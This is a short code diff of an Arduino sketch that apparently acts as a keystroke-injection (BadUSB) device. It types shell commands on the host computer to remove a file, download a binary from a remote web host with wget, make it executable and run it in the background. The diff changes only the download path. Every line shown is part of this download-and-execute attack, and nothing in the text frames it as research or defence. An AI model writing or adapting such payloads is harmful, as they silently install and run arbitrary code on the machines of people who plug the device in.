@@ -7,7 +7,7 @@ void setup() {
   delay(3000);
   Keyboard.println("rm xxoo.out");
   delay(2000);
-  Keyboard.println("wget http://www.test.com/test.exe -O xxoo.out");
+  Keyboard.println("wget http://www.test.com/xxoo.out -O xxoo.out");
   delay(2000);
   Keyboard.println("chmod +x xxoo.out");
   Keyboard.println("./xxoo.out &");
